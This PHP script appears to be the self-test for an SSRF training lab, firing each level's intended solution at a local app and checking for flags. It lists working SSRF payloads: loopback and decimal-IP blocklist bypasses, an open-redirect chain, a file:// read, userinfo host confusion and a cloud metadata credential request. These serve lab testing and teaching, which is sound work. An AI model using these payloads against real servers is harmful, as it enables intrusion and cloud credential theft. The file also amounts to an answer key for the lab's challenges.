<?php
/**
 * SSRF Lab self-test: runs the intended solution for every level against the
 * live app, so a level that has quietly stopped being solvable is caught.
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 *
 * Not part of the challenge - it exists so the lab can be regression-tested.
 */
require_once __DIR__ . '/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;

/** GET a level page with the payload URL in ?url= (percent-encoded). */
function fetch_level(int $level, string $payload): string
{
    global $base;
    $url = "$base/level$level.php?url=" . rawurlencode($payload);
    $ctx = stream_context_create(['http' => [
        'method'        => 'GET',
        'timeout'       => 30,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($url, false, $ctx);
}

function check(int $level, string $body, string $note = ''): void
{
    global $pass, $fail;
    $want = get_flag_for_level($level);
    if ($want !== '' && strpos($body, $want) !== false) {
        $pass++;
        printf("  PASS  level %-2d %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    } else {
        $fail++;
        printf("  FAIL  level %-2d expected %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    }
}

/** Secondary vectors: reported but not counted, so a dead alternative is visible. */
function alt(int $level, string $body, string $note): void
{
    echo strpos($body, get_flag_for_level($level)) !== false
        ? "        alt   level $level  ok    ($note)\n"
        : "        WARN  level $level  alternative did not land ($note)\n";
}

/**
 * Sanity gate: the internal resources must genuinely refuse a non-loopback
 * caller, otherwise "reaching them" would prove nothing.
 */
function assert_refuses_outsiders(): void
{
    $ctx = stream_context_create(['http' => ['timeout' => 10, 'ignore_errors' => true]]);
    // Reach the container by a non-loopback address so REMOTE_ADDR is not 127.x.
    $selfIp = trim((string)@shell_exec("hostname -i 2>/dev/null")) ?: '';
    $selfIp = trim(explode(' ', $selfIp)[0] ?? '');
    if ($selfIp === '' || strncmp($selfIp, '127.', 4) === 0) {
        echo "  note  could not determine a non-loopback address; skipping the 403 pre-check\n";
        return;
    }
    foreach (['internal.php?level=1', 'admin.php', 'beacon.php',
              'latest/meta-data/iam/security-credentials/ssrf-lab-role'] as $path) {
        $body = (string)@file_get_contents("http://$selfIp/$path", false, $ctx);
        $ok   = strpos($body, '403 Forbidden') !== false;
        printf("  %s  guard %-52s %s\n", $ok ? 'ok  ' : 'WARN', $path,
            $ok ? 'refuses non-loopback callers' : 'DID NOT return 403 to an outside caller');
    }
}

echo "SSRF Lab self-test\n------------------\n";
assert_refuses_outsiders();
echo "\n";

/* 1 - no validation at all: point the fetcher straight at loopback */
check(1, fetch_level(1, 'http://127.0.0.1/internal.php?level=1'), 'loopback fetch');
alt(1, fetch_level(1, 'http://localhost/internal.php?level=1'), 'localhost spelling');

/* 2 - loopback-only management panel, reached through the server */
check(2, fetch_level(2, 'http://127.0.0.1/admin.php'), 'internal admin panel');

/* 3 - blind: body withheld, confirmation is server-side only */
check(3, fetch_level(3, 'http://127.0.0.1/beacon.php'), 'internal beacon hit');

/* 4 - blocklist knows only two spellings of loopback */
check(4, fetch_level(4, 'http://2130706433/internal.php?level=4'), 'decimal IP');
alt(4, fetch_level(4, 'http://127.1/internal.php?level=4'), 'short form 127.1');
alt(4, fetch_level(4, 'http://[::1]/internal.php?level=4'), 'IPv6 loopback');
alt(4, fetch_level(4, 'http://0/internal.php?level=4'), 'integer 0');

/* 5 - allowlist checks only the first hop; curl follows the 302 */
check(5, fetch_level(5, 'http://feed.local/redirector.php?url=http://127.0.0.1/internal.php?level=5'),
    'open redirect chain');

/* 6 - the scheme is never validated */
check(6, fetch_level(6, 'file:///var/secret/flag6.txt'), 'file:// wrapper');

/* 7 - example.com sits in the userinfo, the real host is loopback */
check(7, fetch_level(7, 'http://example.com@127.0.0.1/internal.php?level=7'), 'userinfo confusion');

/* 8 - cloud instance metadata, reachable only from inside the box */
check(8, fetch_level(8, 'http://169.254.169.254/latest/meta-data/iam/security-credentials/ssrf-lab-role'),
    'IMDS credentials');

/* 9 - substring allowlist satisfied by an attacker-owned name */
check(9, fetch_level(9, 'http://corp-internal.attacker.local/internal.php?level=9'), 'substring allowlist');

/* 10 - three filter layers, one surviving vector */
check(10, fetch_level(10, 'http://2130706433/internal.php?level=10'), 'decimal IP beats all layers');

echo "------------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
